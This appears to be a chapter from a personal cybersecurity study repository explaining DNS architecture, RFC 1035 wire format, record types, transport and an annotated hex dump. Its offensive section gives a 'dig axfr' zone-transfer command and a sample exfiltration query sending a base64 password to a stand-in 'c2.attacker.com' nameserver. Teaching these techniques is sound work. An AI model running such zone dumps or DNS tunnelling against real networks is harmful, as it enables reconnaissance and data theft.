<!-- =========================================================================
   PROJECT: IW Cyber Ops — Knowledge Base (Intelligence Vault)
   AUTHOR: Muhammad Imran Wakeel | IW Cyber Ops (@iwcyberops)
   TRACK: 42-Month Systems & Cyber Operations Research
   MODULE: Month 02 — Network Protocols, Packet Dissection & Traffic Engineering
   DOCUMENT: Chapter 05 — Application Layer Protocols & TLS Architecture (Part 5.1)
   ========================================================================= -->

# 🌍 Chapter 05: Application Protocols & Cryptography (Part 5.1)

> **IW Cyber Ops Research Vault | Module 02: Network Protocols & Traffic Engineering**  
> *Author: Muhammad Imran Wakeel (@iwcyberops)*  
> *Track: RFC 1035 DNS Wire Specifications, Binary Headers, Record Types & Tunneling*

---

## 1. Domain Name System (DNS) Architecture & Hierarchy

The **Domain Name System (DNS — RFC 1034 / RFC 1035)** is an inverted, globally distributed, hierarchical database that resolves human-readable **Fully Qualified Domain Names (FQDN)** into machine-routable **IP Addresses** (and vice versa).

```
                                  [ ROOT ZONE: "." ]
                                  (13 Root Server Clusters: A.ROOT-SERVERS.NET to M)
                                           │
         ┌─────────────────────────────────┼─────────────────────────────────┐
         ▼                                 ▼                                 ▼
   [ gTLD: ".com" ]                  [ gTLD: ".org" ]                  [ ccTLD: ".pk" ]
         │                                 │                                 │
         ▼                                 ▼                                 ▼
 [ "target.com" Authoritative ]   [ "archive.org" Authoritative ]    [ "gov.pk" Authoritative ]
         │
         ▼
 [ Subdomain: "c2.target.com" ]
```

---

### Recursive vs Iterative Resolution Flow

```
 [ Local Host ] ──( 1. Recursive Query: "Where is target.com?" )──> [ Local Recursive Resolver ]
                                                                       (e.g., 8.8.8.8 / 1.1.1.1)
                                                                                   │
       ┌───────────────────────────────────────────────────────────────────────────┤
       │ 2. Iterative Query: "Where is target.com?"                                │
       ▼                                                                           │
 [ Root Name Server ] ──> Returns Referral: "Ask .com TLD at 192.5.6.30" ──────────┤
                                                                                   │
       ┌───────────────────────────────────────────────────────────────────────────┤
       │ 3. Iterative Query: "Where is target.com?"                                │
       ▼                                                                           │
 [ .com TLD Server ]  ──> Returns Referral: "Ask target.com NS at 203.0.113.53" ───┤
                                                                                   │
       ┌───────────────────────────────────────────────────────────────────────────┤
       │ 4. Iterative Query: "Where is target.com?"                                │
       ▼                                                                           │
 [ Authoritative NS ] ──> Returns Final ANSWER: "target.com A 93.184.216.34" ──────┘
       │
       ▼
 [ Local Resolver caches record & returns IP to Host ]
```

1. **Recursive Query (Client to Resolver):** The client offloads the entire resolution task to the recursive resolver. The resolver **must** return either the final IP or an error (`NXDOMAIN`).
2. **Iterative Query (Resolver to World):** The resolver queries servers step-by-step. If a server does not know the answer, it returns a **Referral (Delegation)** pointing to the next-hop authoritative name server down the tree.

---

## 2. DNS Binary Wire Format (RFC 1035 Dissection)

Every DNS message—whether query or response, UDP or TCP—shares an identical **Base Binary Structure**:

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Transaction ID        |             Flags             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|       Questions Count         |      Answer Records Count     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|    Authority Records Count    |    Additional Records Count   |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                       Questions Section                       /
/                                                               /
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                    Answer Records Section                     /
/                                                               /
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                   Authority Records Section                   /
/                                                               /
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
/                   Additional Records Section                  /
/                                                               /
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
│ ◄──────────────── Fixed Header: Exactly 12 Bytes ───────────► │
```

---

### The 16-Bit Flags Register Breakdown

```text
 0   1   2   3   4   5   6   7   8   9  10  11  12  13  14  15
┌───┬───────────────┬───┬───┬───┬───┬───────────┬───────────────┐
│QR │    Opcode     │AA │TC │RD │RA │     Z     │     RCODE     │
└───┴───────────────┴───┴───┴───┴───┴───────────┴───────────────┘
```

| Flag Field | Bits | Function | Binary / Operational Values |
| :--- | :---: | :--- | :--- |
| **`QR`** | 1 Bit | **Query / Response Flag** | `0` = Query, `1` = Response |
| **`Opcode`** | 4 Bits | Query Type Specifier | `0` = Standard Query (`QUERY`), `1` = Inverse (`IQUERY`), `2` = Server Status |
| **`AA`** | 1 Bit | **Authoritative Answer** | `1` = Responding server is the official owner of the domain |
| **`TC`** | 1 Bit | **Truncated Response** | `1` = Message exceeded $512\text{ bytes}$; client must retry via **TCP Port 53** |
| **`RD`** | 1 Bit | **Recursion Desired** | `1` = Informs resolver to recursively resolve the domain |
| **`RA`** | 1 Bit | **Recursion Available**| `1` = Set by resolver to confirm it supports recursive lookups |
| **`Z`** | 3 Bits | Reserved | Must be `000` in standard queries (Used by DNSSEC) |
| **`RCODE`** | 4 Bits | **Response Return Code** | `0` = No Error (`NOERROR`)<br>`2` = Server Failure (`SERVFAIL`)<br>`3` = Non-Existent Domain (`NXDOMAIN`)<br>`5` = Refused (`REFUSED`) |

---

## 3. Wire Encoding: QNAME Labels & DNS Compression

### 1. The QNAME String Format (Length-Byte Encoding)
DNS does not use ASCII null-terminated strings or periods (`.`) on the wire. Domain names are encoded as a series of **Length-Prefixed Labels**:

$$\text{"c2.target.com"} \implies \mathbf{\backslash\text{x02 c 2 } \backslash\text{x06 t a r g e t } \backslash\text{x03 c o m } \backslash\text{x00}}$$

* `\x02` = Next label is 2 bytes long: `c2`.
* `\x06` = Next label is 6 bytes long: `target`.
* `\x03` = Next label is 3 bytes long: `com`.
* `\x00` = **Root Null Terminator (0x00):** Terminates the domain string.

---

### 2. DNS Pointer Compression (`0xC0` Offset)
To save bandwidth, when a domain name appears multiple times in a single packet (e.g., in the Question, Answer, and Authority sections), DNS replaces duplicate strings with a **2-byte Compression Pointer**:

```text
 1 1 0 0 0 0 0 0    0 0 0 1 1 1 0 0
├───────────────┼──────────────────┤
│ Magic: 0xC0   │ Pointer Offset:  │  ──> Points to Byte Offset 28 from the start
│ (Top 2 bits=1)│ 14 Bits (0x001C) │      of the DNS header where the name was first seen!
└───────────────┴──────────────────┘
```

> ⚠️ **The Top Two Bits Rule:** If a label length starts with binary `11` (`0xC0` in hex), the parser treats it as an in-memory byte offset pointer, **NOT** a literal string length.

---

### 3. Resource Record (RR) Structure

The Answer, Authority, and Additional sections use the **Resource Record (RR)** wire format:

```
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                        DNS RESOURCE RECORD (RR) SPECIFICATION                          │
├───────────────────────────────────────────┬────────────────────────────────────────────┤
│ NAME (Variable: Domain name or 2B Pointer)│ TYPE (2 Bytes: e.g., 0x0001 for 'A')       │
├───────────────────────────────────────────┼────────────────────────────────────────────┤
│ CLASS (2 Bytes: Always 0x0001 for IN/Net) │ TTL (4 Bytes: 32-Bit Cache Time-To-Live)   │
├───────────────────────────────────────────┴────────────────────────────────────────────┤
│ RDLENGTH (2 Bytes: Byte length of RDATA)  │ RDATA (Variable: The resolved record IP)   │
└───────────────────────────────────────────┴────────────────────────────────────────────┘
```

---

### Core DNS Record Types Reference Matrix

| Type | Hex | Type Name | Purpose & Stored RDATA Format |
| :---: | :---: | :--- | :--- |
| **`1`** | `0x0001` | **A** | Maps hostname to 32-bit IPv4 address (`93.184.216.34`) |
| **`28`**| `0x001C` | **AAAA**| Maps hostname to 128-bit IPv6 address (`2606:2800:220:1:248:...`) |
| **`5`** | `0x0005` | **CNAME** | Canonical Name (Alias mapping one domain to another domain) |
| **`15`**| `0x000F` | **MX** | Mail Exchange server (Includes a 16-bit Priority integer) |
| **`2`** | `0x0002` | **NS** | Authoritative Name Server for the delegated zone |
| **`16`**| `0x0010` | **TXT** | Text strings (Used for SPF, DKIM, DMARC, and C2 exfiltration) |
| **`6`** | `0x0006` | **SOA** | Start of Authority (Zone serial number, refresh/retry timers) |
| **`12`**| `0x000C` | **PTR** | Pointer Record (Reverse DNS: Maps IP to domain under `.in-addr.arpa`) |
| **`33`**| `0x0021` | **SRV** | Service Locator (Defines Port, Priority, Weight, Hostname) |

---

## 4. Transport Dynamics: UDP 53 vs TCP 53

```
┌────────────────────────────────────────────────────────────────────────────────────────┐
│                        DNS TRANSPORT ARBITRATION MATRIX                                │
├───────────────────┬──────────────┬─────────────────────────────────────────────────────┤
│ Protocol          │ Port         │ Operational Condition                               │
├───────────────────┼──────────────┼─────────────────────────────────────────────────────┤
│ **UDP**           │ Port 53      │ Standard lookups where response payload $\le 512\text{ Bytes}$.│
├───────────────────┼──────────────┼─────────────────────────────────────────────────────┤
│ **TCP**           │ Port 53      │ 1. Truncated queries (**TC=1 Flag Set**).            │
│                   │              │ 2. **Zone Transfers (`AXFR` / `IXFR`)**.             │
│                   │              │ 3. DNSSEC responses exceeding standard MTU.         │
├───────────────────┼──────────────┼─────────────────────────────────────────────────────┤
│ **DoT (TLS)**     │ TCP 853      │ DNS over TLS: Encrypted DNS privacy channel.        │
│ **DoH (HTTPS)**   │ TCP 443      │ DNS over HTTPS: Encrypted queries over HTTP/2 HTTP/3│
└───────────────────┴──────────────┴─────────────────────────────────────────────────────┘
```

* **EDNS0 (RFC 6891 — Extension Mechanisms for DNS):** Overcomes the legacy 512-byte UDP limit by advertising an expanded client buffer size (e.g., $4096\text{ bytes}$) via an **OPT pseudo-record**, allowing large DNSSEC payloads without failing over to TCP.

---

## 5. 🔬 Raw Wire Hex Dissection: Live DNS Query

Below is an annotated hex dump of an actual raw DNS Query for `example.com` (Type A) captured via `tcpdump -xx`:

```text
1a 2b 01 00 00 01 00 00 00 00 00 00 07 65 78 61 6d 70 6c 65 03 63 6f 6d 00 00 01 00 01
```

```
 1a 2b │ 01 00 │ 00 01 │ 00 00 │ 00 00 │ 00 00 │ 07 65 78 61 6d 70 6c 65 03 63 6f 6d 00 │ 00 01 │ 00 01
 ──────┼───────┼───────┼───────┼───────┼───────┼────────────────────────────────────────┼───────┼───────
  TxID   Flags  QDCOUNT ANCOUNT NSCOUNT ARCOUNT  QNAME: [7]example[3]com[0]              QTYPE   QCLASS
(0x1a2b)(0x0100) (1 Q)   (0)     (0)     (0)     Encoded Label Stream                    (Type A)(IN=1)
```

* `1a 2b` $\longrightarrow$ Transaction ID: `0x1A2B` (Matched by the client in the reply).
* `01 00` $\longrightarrow$ Flags: `0x0100` (Binary: `0000 0001 0000 0000` $\implies$ **QR=0** [Query], **RD=1** [Recursion Desired]).
* `00 01` $\longrightarrow$ Questions Count: `1`.
* `00 00 ...` $\longrightarrow$ Answer, Authority, Additional Counts all `0`.
* `07 65 78 61 6d 70 6c 65` $\longrightarrow$ Length `7`, string: `example`.
* `03 63 6f 6d` $\longrightarrow$ Length `3`, string: `com`.
* `00` $\longrightarrow$ Root Domain Terminator (`\x00`).
* `00 01` $\longrightarrow$ QTYPE: `0x0001` (Type A — IPv4).
* `00 01` $\longrightarrow$ QCLASS: `0x0001` (Class IN — Internet).

---

## 6. Offensive Tradecraft & Cyber Operations

```
┌────────────────────────────────────────────────────────────────────────┐
│                   DNS ATTACK & EXPLOITATION TAXONOMY                   │
├──────────────────────────┬─────────────────────────────────────────────┤
│ 1. DNS Zone Transfer     │ Dumping full internal network topologies    │
│    (AXFR Exploitation)   │ via misconfigured Authoritative Name Servers│
│ 2. DNS Covert C2         │ Encoding stolen data / reverse shells inside│
│    Tunneling & Exfil     │ TXT / A query streams across restricted nets│
│ 3. Subdomain Bruteforce  │ High-speed dictionary mapping of hidden web │
│                          │ admin panels and staging portals            │
└──────────────────────────┴─────────────────────────────────────────────┘
```

---

### 1. DNS Full Zone Transfer Exploitation (`AXFR`)
* **Vulnerability:** Authoritative name servers use `AXFR` over **TCP Port 53** to replicate records to secondary servers. If an administrator fails to restrict transfers to authorized IPs, anyone can dump the **entire internal network infrastructure**:

```bash
# Attempt Full Zone Transfer using dig:
dig axfr @ns1.target.com target.com

# Returns 100% of internal hosts:
# target.com.         IN  SOA  ns1.target.com. admin.target.com. (...)
# dev-vpn.target.com. IN  A    10.10.14.5
# staging.target.com. IN  A    10.10.14.8
# secret.target.com.  IN  TXT  "internal-api-key-1337"
```

---

### 2. DNS Covert Tunneling & Exfiltration (Bypassing Air-Gaps)
* **Mechanics:** Many corporate firewalls block all outbound HTTP/HTTPS/SSH traffic, but **permit internal DNS queries to external resolvers**.
* **Exploitation:** Malware encodes stolen files into subdomains and queries its own malicious authoritative name server:
  ```text
  Client Query: aW1yYW4ucGFzc3dvcmQxMjM=.c2.attacker.com ──> Recursive Resolver ──> Attacker NS
  ```
* The attacker's authoritative server decodes the base64 subdomain string (`imran.password123`), capturing the data while completely bypassing perimeter firewalls!

---

## 7. Live DNS Diagnostics & Packet Inspection

```bash
# 1. Query Specific Record Types with Detailed Output via dig
dig target.com ANY +noall +answer

# 2. Trace Step-by-Step Iterative Resolution from Root Servers
dig target.com +trace

# 3. Reverse DNS Lookup (PTR Query)
dig -x 93.184.216.34 +short

# 4. Capture Live DNS Packets with Full Header Decode via tcpdump
sudo tcpdump -i eth0 -nn -vvv -s0 'udp port 53'

# 5. Extract Unique Queried Domains from Network Streams
sudo tcpdump -i eth0 -l -nn 'udp port 53' | awk '{print $NF}'
```

---

<!-- =========================================================================
   [IW CYBER OPS] - INTERNAL RESEARCH USE ONLY
   Repository: https://github.com/iwcyberops/IW-Knowledge-Base
   ========================================================================= -->
